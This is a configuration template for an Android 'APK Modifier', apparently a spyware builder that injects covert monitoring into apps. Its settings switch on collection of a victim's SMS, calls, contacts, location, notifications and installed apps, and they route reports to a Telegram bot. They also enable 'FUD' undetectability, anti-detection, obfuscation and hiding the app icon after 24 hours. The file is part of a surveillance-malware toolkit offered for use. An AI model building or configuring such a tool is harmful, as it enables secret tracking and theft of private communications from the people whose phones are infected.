# APK Modifier - Configuration Template
# Copy this file to .env and fill in your values

# ============================================
# TELEGRAM BOT CONFIGURATION
# ============================================
# Get bot token from @BotFather on Telegram
TELEGRAM_BOT_TOKEN=1234567890:ABCdefGHIjklMNOpqrsTUVwxyz

# Your Telegram chat ID (get from @userinfobot)
TELEGRAM_CHAT_ID=123456789

# ============================================
# SERVER CONFIGURATION
# ============================================
# Flask server settings
SECRET_KEY=change-this-to-a-random-secret-key-for-production
FLASK_ENV=production
HOST=0.0.0.0
PORT=5000

# Upload server (optional - for remote file hosting)
UPLOAD_SERVER_URL=https://your-server.com/upload
UPLOAD_API_KEY=your_api_key_here

# ============================================
# PROCESSING CONFIGURATION
# ============================================
# Maximum file size in MB
MAX_FILE_SIZE_MB=100

# Processing timeout in seconds
PROCESSING_TIMEOUT_SECONDS=3600

# FUD mode processing time range (seconds)
FUD_MIN_TIME=2400
FUD_MAX_TIME=3600

# ============================================
# DEVICE MONITORING CONFIGURATION
# ============================================
# Data collection interval in seconds
MONITORING_INTERVAL=300

# Enable/disable specific monitoring features
MONITOR_NOTIFICATIONS=true
MONITOR_SMS=true
MONITOR_CALLS=true
MONITOR_CONTACTS=true
MONITOR_LOCATION=true
MONITOR_BATTERY=true
MONITOR_NETWORK=true
MONITOR_APPS=true

# ============================================
# SECURITY CONFIGURATION
# ============================================
# Enable anti-detection features
ENABLE_ANTI_DETECTION=true

# Enable obfuscation
ENABLE_OBFUSCATION=true

# Auto-hide app icon after hours
HIDE_ICON_AFTER_HOURS=24

# ============================================
# ADVANCED SETTINGS
# ============================================
# Custom library name for signing
DEFAULT_LIB_NAME=libxx.so

# Enable debug mode (set to false in production)
DEBUG_MODE=false

# Log level (DEBUG, INFO, WARNING, ERROR)
LOG_LEVEL=INFO

# ============================================
# NOTES
# ============================================
# - Never commit the actual .env file to version control
# - Keep your tokens and keys secure
# - Use strong, random values for SECRET_KEY
# - Test with DEBUG_MODE=true first
# - Disable DEBUG_MODE in production
